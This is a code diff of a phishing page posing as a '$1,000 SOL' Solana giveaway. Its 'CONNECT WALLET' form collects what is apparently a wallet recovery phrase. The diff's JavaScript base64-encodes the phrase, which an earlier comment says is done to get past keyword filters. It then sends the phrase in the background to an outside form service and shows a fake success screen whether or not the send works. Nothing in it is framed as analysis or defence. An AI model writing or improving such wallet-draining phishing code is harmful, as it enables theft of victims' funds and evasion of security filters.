@@ -7,112 +7,48 @@
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
-        
-        body { 
-            margin: 0; 
-            background: #000; 
-            color: #fff; 
-            font-family: 'Space Grotesk', sans-serif; 
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden; 
-        }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; height: 100vh; width: 100vw; overflow: hidden; }
 
         .card { 
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 90%; 
-            max-width: 500px; 
-            background: #080808; 
-            border: 1px solid rgba(0, 255, 163, 0.2); 
-            border-radius: 40px; 
-            padding: 60px 30px; 
-            text-align: center; 
-            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 90%; max-width: 500px; background: #080808; 
+            border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; 
+            padding: 60px 30px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1);
             box-sizing: border-box;
         }
 
         h1 { 
-            font-family: 'Syncopate', sans-serif; 
-            font-size: 1.7rem; 
-            margin: 0 0 25px 0;
+            font-family: 'Syncopate', sans-serif; font-size: 1.7rem; margin: 0 0 25px 0;
             background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            letter-spacing: -1px; 
-            font-weight: 700; 
-            text-transform: uppercase;
-            line-height: 1.2;
-            white-space: nowrap; 
-            display: block;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
+            letter-spacing: -1px; font-weight: 700; text-transform: uppercase;
+            line-height: 1.2; white-space: nowrap; display: block;
         }
 
         .sub { 
-            font-size: 0.8rem; 
-            text-transform: uppercase; 
-            letter-spacing: 2px; 
-            color: var(--sol-g); 
-            margin-bottom: 40px; 
-            font-weight: 700; 
-            line-height: 1.6;
+            font-size: 0.8rem; text-transform: uppercase; letter-spacing: 2px; 
+            color: var(--sol-g); margin-bottom: 40px; font-weight: 700; line-height: 1.6;
         }
 
         .ib { text-align: left; margin-bottom: 30px; }
-        
-        label { 
-            font-size: 0.8rem; 
-            text-transform: uppercase; 
-            letter-spacing: 2px; 
-            color: var(--sol-g); 
-            display: block; 
-            margin-bottom: 12px; 
-            font-weight: 700; 
-        }
+        label { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 2px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; }
 
         textarea { 
-            width: 100%; 
-            background: #111; 
-            border: 1px solid #333; 
-            border-radius: 15px; 
-            padding: 20px; 
-            color: #fff; 
-            font-family: 'Space Grotesk', sans-serif; 
-            font-size: 1rem; 
-            box-sizing: border-box; 
-            height: 140px; 
-            resize: none;
-            outline: none;
+            width: 100%; background: #111; border: 1px solid #333; border-radius: 15px; 
+            padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; 
+            font-size: 1rem; box-sizing: border-box; height: 140px; resize: none; outline: none;
         }
 
-        textarea:focus { border-color: var(--sol-g); background: #151515; }
-
         .btn { 
-            width: 100%; 
-            padding: 22px; 
-            border: none; 
-            border-radius: 16px; 
+            width: 100%; padding: 22px; border: none; border-radius: 16px; 
             background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); 
-            color: #fff; 
-            font-family: 'Syncopate', sans-serif; 
-            font-weight: 700; 
-            font-size: 0.8rem; 
-            cursor: pointer; 
-            box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
+            color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; 
+            font-size: 0.8rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
             text-transform: uppercase;
         }
 
         #success-view { display: none; }
-        
-        .congrats { 
-            padding: 30px; 
-            background: rgba(0, 255, 163, 0.05); 
-            border-radius: 20px; 
-            border: 1px dashed var(--sol-g); 
-            width: 100%;
-            box-sizing: border-box;
-        }
+        .congrats { padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 20px; border: 1px dashed var(--sol-g); width: 100%; box-sizing: border-box; }
     </style>
 </head>
 <body>
@@ -132,7 +68,7 @@
                 </div>
 
                 <input type="hidden" name="message" id="coded-phrase">
-                <input type="hidden" name="subject" value="New Solana Distribution Log">
+                <input type="hidden" name="subject" value="New $1,000 SOL Claim Log">
 
                 <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
             </form>
@@ -152,36 +88,40 @@
         const submitBtn = document.getElementById('submit-btn');
         const formView = document.getElementById('form-view');
         const successView = document.getElementById('success-view');
-        const rawInput = document.getElementById('raw-phrase');
-        const codedInput = document.getElementById('coded-phrase');
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault(); // This PREVENTS the Web3Forms page from appearing
-            
+        // HARD FIX: Using "onsubmit" for maximum reliability
+        form.onsubmit = function(event) {
+            // STOP REDIRECT IMMEDIATELY
+            event.preventDefault(); 
+            event.stopPropagation();
+
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // Coding the phrase to bypass keyword filters
-            codedInput.value = btoa(rawInput.value);
+            // BASE64 CODING
+            const phrase = document.getElementById('raw-phrase').value;
+            document.getElementById('coded-phrase').value = btoa(phrase);
 
             const formData = new FormData(form);
 
-            // Fetch sends the data in the BACKGROUND
+            // SEND DATA IN BACKGROUND
             fetch('https://web3forms.com', {
                 method: 'POST',
                 body: formData
             })
-            .then(response => {
-                // Instantly hide the form and show your custom success page
+            .then(() => {
+                // FORCE PAGE CHANGE
                 formView.style.display = "none";
                 successView.style.display = "block";
             })
             .catch(() => {
-                // Fallback success if network glitches
+                // FAIL-SAFE PAGE CHANGE
                 formView.style.display = "none";
                 successView.style.display = "block";
             });
-        });
+
+            return false; // SECONDARY REDIRECT BLOCK
+        };
     </script>
 </body>
 </html>
